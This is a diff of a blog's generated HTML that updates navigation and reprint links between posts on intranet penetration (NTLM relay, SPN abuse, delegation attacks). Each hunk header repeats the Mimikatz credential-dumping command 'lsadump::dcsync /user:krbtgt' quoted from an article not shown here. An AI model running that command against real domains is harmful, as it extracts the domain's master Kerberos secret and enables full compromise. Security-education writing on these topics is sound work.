+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291783.html">内网渗透之横向移动 ：AS-REP Roasting&amp;Kerberoast</a></p>
 
             </div>
             <hr/>
@@ -682,7 +562,7 @@ lsadump::dcsync /user:krbtgt</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://keepaha.com/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">http://keepaha.com/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/</a>
+                    <a href="http://keepaha.com/2022/03/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BSPN%E5%88%A9%E7%94%A8/">http://keepaha.com/2022/03/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BSPN%E5%88%A9%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -887,9 +767,10 @@ lsadump::dcsync /user:krbtgt</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BSPN%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
@@ -907,9 +788,9 @@ lsadump::dcsync /user:krbtgt</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -918,6 +799,7 @@ lsadump::dcsync /user:krbtgt</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -928,13 +810,13 @@ lsadump::dcsync /user:krbtgt</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+                <a href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="内网渗透篇-非约束/约束委派攻击">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="内网渗透篇-NTLM Relay攻击">
                         
-                        <span class="card-title">内网渗透篇-非约束/约束委派攻击</span>
+                        <span class="card-title">内网渗透篇-NTLM Relay攻击</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -945,7 +827,7 @@ lsadump::dcsync /user:krbtgt</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-10
                             </span>
                         <span class="publish-author">
                             
